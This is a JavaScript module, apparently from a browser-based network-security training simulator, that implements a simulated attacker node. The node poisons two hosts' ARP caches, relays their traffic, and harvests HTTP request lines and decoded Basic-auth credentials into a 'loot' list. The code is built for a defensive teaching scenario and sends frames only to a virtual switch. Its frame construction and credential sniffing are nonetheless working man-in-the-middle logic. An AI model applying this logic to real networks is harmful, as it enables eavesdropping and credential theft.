// シナリオの「攻撃者ノード」: ARP スプーフィングで中間者になる、スイッチのポート（P9〜P12）につなぐ JS のノード。
// DOM にも v86 にも依存しない（Node でテストできる。時計・タイマーは差し替えられる）。ページの外へは通信しない
// （フレームはスイッチのポートに出すだけ）。シナリオ S5「社内の盗聴を止める」で使う。docs/scenarios.md
//
// VmNode と同じ形（on('frame') / injectFrame）なので、VirtualSwitch.addPort にそのまま渡せる。
//   new Attacker({ name, mac, ip, prefix, targets: [IP, IP], intervalMs = 1500, relay = true, decrementTtl = true, maxLoot = 50 })
//   start()  動き始める: 標的それぞれの本当の MAC を ARP で調べ、intervalMs ごとに「もう一方の IP は自分の MAC」という
//            ARP 応答（op=2、ユニキャスト）を両方に送り続ける。学習者が ARP キャッシュを消しても、すぐにまた汚染される（arpspoof と同じ）
//   stop()   タイマーをすべて止める。以後は何も送らない（シナリオの「最初からやり直す」）
//   loot     盗んだもの（新しいものが後ろ。上限 maxLoot 件で古いものから捨てる）:
//            { ts, src, dst, request（HTTP のリクエスト行）, user, password（Authorization: Basic をデコードしたもの。無ければ null） }
//   on('loot', fn)  盗んだものが増えたら知らせる
//
// relay: 自分の MAC 宛てで、IP の宛先が自分でないフレームは、宛先の本当の MAC に書き換えて送り返す（通信は切れない）。
//   送り先: IP の宛先が標的なら、その標的。そうでなく、送り元が標的なら、もう一方の標的（ゲートウェイ）。どちらでもなければ捨てる。
//   decrementTtl なら TTL を 1 減らし、IP ヘッダのチェックサムを計算し直す（Linux の ip_forward で中継したときと同じ。
//   ping の TTL が 1 減るのが、気づく手がかりになる）。TTL が 1 以下なら捨てる
// 不正なフレームでは例外を投げない（数えて無視する）。

import { checksum } from './probe.js';

const ipToBytes = (ip) => ip.split('.').map(Number);
const bytesToIp = (b, o) => `${b[o]}.${b[o + 1]}.${b[o + 2]}.${b[o + 3]}`;
const macToBytes = (mac) => mac.split(':').map((x) => parseInt(x, 16));
const macStr = (b, o) => [...b.slice(o, o + 6)].map((x) => x.toString(16).padStart(2, '0')).join(':');
const BCAST = 'ff:ff:ff:ff:ff:ff';
const HTTP_REQUEST = /^(GET|POST|HEAD|PUT|DELETE|OPTIONS|PATCH) (\S{1,200}) HTTP\/1\.[01]\r?$/m;
const BASIC = /^Authorization:[ \t]*Basic[ \t]+([A-Za-z0-9+/=]{1,400})\r?$/im;

/** Base64（Authorization: Basic）をデコードする。読めなければ null */
export function decodeBasic(b64) {
  try {
    const bin = atob(b64);
    const text = new TextDecoder().decode(Uint8Array.from(bin, (c) => c.charCodeAt(0)));
    const i = text.indexOf(':');
    return i < 0 ? { user: text, password: '' } : { user: text.slice(0, i), password: text.slice(i + 1) };
  } catch {
    return null;
  }
}

export class Attacker {
  /**
   * @param {{ name?: string, mac: string, ip: string, prefix?: number, targets: string[], intervalMs?: number, relay?: boolean, decrementTtl?: boolean, maxLoot?: number }} cfg
   * @param {{ now?: () => number, setTimer?: Function, clearTimer?: Function }} env
   */
  constructor(cfg, env = {}) {
    this.cfg = { intervalMs: 1500, relay: true, decrementTtl: true, maxLoot: 50, prefix: 24, ...cfg };
    this.name = cfg.name ?? 'attacker';
    this.mac = macToBytes(cfg.mac);
    this.macText = cfg.mac.toLowerCase();
    this.targets = [...cfg.targets];
    this.now = env.now ?? (() => Date.now());
    this.setTimer = env.setTimer ?? ((fn, ms) => setTimeout(fn, ms));
    this.clearTimer = env.clearTimer ?? ((t) => clearTimeout(t));
    this.listeners = new Map();
    this.real = new Map();          // 標的の IP → 本当の MAC（バイト列）
    this.loot = [];
    this.timer = null;
    this.running = false;
    this.stopped = false;
    this.ipId = 1;
    this.stats = { sent: 0, received: 0, ignored: 0, poisoned: 0, relayed: 0, dropped: 0 };
  }

  on(type, fn) {
    if (!this.listeners.has(type)) this.listeners.set(type, new Set());
    this.listeners.get(type).add(fn);
    return () => this.listeners.get(type)?.delete(fn);
  }

  emit(type, value) {
    for (const fn of this.listeners.get(type) ?? []) fn(value);
  }

  send(frame) {
    if (this.stopped) return;
    this.stats.sent++;
    this.emit('frame', frame);
  }

  // ---------------------------------------------------------------- 動き

  start() {
    if (this.running || this.stopped) return;
    this.running = true;
    this.tick();
  }

  stop() {
    this.stopped = true;
    this.running = false;
    if (this.timer !== null) this.clearTimer(this.timer);
    this.timer = null;
  }

  /** 後片づけ（Probe と同じ名前） */
  dispose() {
    this.stop();
  }

  /** 1 回分: 本当の MAC を知らない標的には ARP の問い合わせ、知っている標的には汚染の ARP 応答。そして次を予約する */
  tick() {
    if (this.stopped) return;
    this.timer = null;
    const [a, b] = this.targets;
    for (const [target, other] of [[a, b], [b, a]]) {
      const mac = this.real.get(target);
      if (!mac) this.send(this.arpFrame(1, null, this.cfg.ip, target));
      else {
        // 「other の IP は、自分（攻撃者）の MAC」と、target にだけ教える
        this.send(this.arpFrame(2, mac, other, target));
        this.stats.poisoned++;
      }
    }
    this.timer = this.setTimer(() => this.tick(), this.cfg.intervalMs);
  }

  /** ARP のフレーム。op=1: 問い合わせ（ブロードキャスト）/ op=2: 応答（tha へのユニキャスト）。送り元の IP は spa（偽ってよい） */
  arpFrame(op, tha, spa, tpa) {
    const f = new Uint8Array(42);
    f.set(op === 1 ? [255, 255, 255, 255, 255, 255] : tha, 0);
    f.set(this.mac, 6);
    f[12] = 8; f[13] = 6;
    f.set([0, 1, 8, 0, 6, 4, 0, op], 14);
    f.set(this.mac, 22);
    f.set(ipToBytes(spa), 28);
    f.set(op === 1 ? [0, 0, 0, 0, 0, 0] : tha, 32);
    f.set(ipToBytes(tpa), 38);
    return f;
  }

  // ---------------------------------------------------------------- 受け取り（スイッチから）

  injectFrame(frame) {
    try {
      if (this.stopped) return;
      this.stats.received++;
      const f = frame instanceof Uint8Array ? frame : new Uint8Array(frame ?? []);
      if (f.length < 14) return this.ignore();
      const dst = macStr(f, 0);
      if (dst !== this.macText && dst !== BCAST) return;
      const type = (f[12] << 8) | f[13];
      if (type === 0x0806) return this.onArp(f);
      if (type === 0x0800 && dst === this.macText) return this.onIp(f);
    } catch {
      this.ignore();
    }
  }

  ignore() { this.stats.ignored++; }

  onArp(f) {
    if (f.length < 42) return this.ignore();
    if (f[14] !== 0 || f[15] !== 1 || f[16] !== 8 || f[17] !== 0 || f[18] !== 6 || f[19] !== 4) return this.ignore();
    const op = (f[20] << 8) | f[21];
    const sha = f.slice(22, 28), spa = bytesToIp(f, 28), tpa = bytesToIp(f, 38);
    // 標的の本当の MAC を覚える（自分の MAC を名乗るもの＝自分の汚染の跳ね返りは覚えない）
    if (this.targets.includes(spa) && macStr(sha, 0) !== this.macText) this.real.set(spa, sha);
    // 自分の IP への問い合わせには答える（ふつうのホストのふり）
    if (op === 1 && tpa === this.cfg.ip) this.send(this.arpFrame(2, sha, this.cfg.ip, spa));
  }

  onIp(f) {
    if (f.length < 34) return this.ignore();
    const ihl = (f[14] & 0x0f) * 4;
    if (f[14] >> 4 !== 4 || ihl < 20 || f.length < 14 + ihl) return this.ignore();
    const src = bytesToIp(f, 26), dst = bytesToIp(f, 30), proto = f[23];
    if (dst === this.cfg.ip) return this.onOwnIp(f, ihl);
    this.steal(f, ihl, src, dst, proto);
    if (!this.cfg.relay) { this.stats.dropped++; return; }
    // 送り先の本当の MAC
    const [a, b] = this.targets;
    const to = this.targets.includes(dst) ? dst : src === a ? b : src === b ? a : null;
    const mac = to ? this.real.get(to) : null;
    if (!mac) { this.stats.dropped++; return; }
    const out = f.slice();
    out.set(mac, 0);
    out.set(this.mac, 6);
    if (this.cfg.decrementTtl) {
      if (out[22] <= 1) { this.stats.dropped++; return; }
      out[22]--;
      out[24] = 0; out[25] = 0;
      const c = checksum(out, 14, 14 + ihl);
      out[24] = c >> 8; out[25] = c & 0xff;
    }
    this.stats.relayed++;
    this.send(out);
  }

  /** 自分の IP あての ICMP echo には答える（ふつうのホストのふり。中身はそのまま返す） */
  onOwnIp(f, ihl) {
    const totalLen = (f[16] << 8) | f[17];
    const end = Math.min(f.length, 14 + totalLen);
    const p = 14 + ihl;
    if (f[23] !== 1 || end - p < 8 || f[p] !== 8) return;
    const out = f.slice(0, end);
    out.set(f.slice(6, 12), 0);
    out.set(this.mac, 6);
    out.set(ipToBytes(this.cfg.ip), 26);   // 送り元 = 自分
    out.set(f.slice(26, 30), 30);          // 宛先 = 問い合わせてきた相手
    out[22] = 64;
    out[24] = 0; out[25] = 0;
    const c = checksum(out, 14, 14 + ihl);
    out[24] = c >> 8; out[25] = c & 0xff;
    out[p] = 0; out[p + 2] = 0; out[p + 3] = 0;
    const ic = checksum(out, p, end);
    out[p + 2] = ic >> 8; out[p + 3] = ic & 0xff;
    this.send(out);
  }

  /** 中継する TCP のデータから、HTTP のリクエスト行と Authorization: Basic を取り出して記録する */
  steal(f, ihl, src, dst, proto) {
    if (proto !== 6) return;
    const totalLen = (f[16] << 8) | f[17];
    const end = Math.min(f.length, 14 + totalLen);
    const p = 14 + ihl;
    if (end - p < 20) return;
    const off = (f[p + 12] >> 4) * 4;
    if (off < 20 || p + off >= end) return;
    const text = new TextDecoder('latin1').decode(f.subarray(p + off, Math.min(end, p + off + 4096)));
    const req = HTTP_REQUEST.exec(text);
    if (!req) return;
    const basic = BASIC.exec(text);
    const cred = basic ? decodeBasic(basic[1]) : null;
    this.loot.push({ ts: this.now(), src, dst, request: `${req[1]} ${req[2]}`, user: cred?.user ?? null, password: cred?.password ?? null });
    if (this.loot.length > this.cfg.maxLoot) this.loot.splice(0, this.loot.length - this.cfg.maxLoot);
    this.emit('loot', this.loot);
  }
}
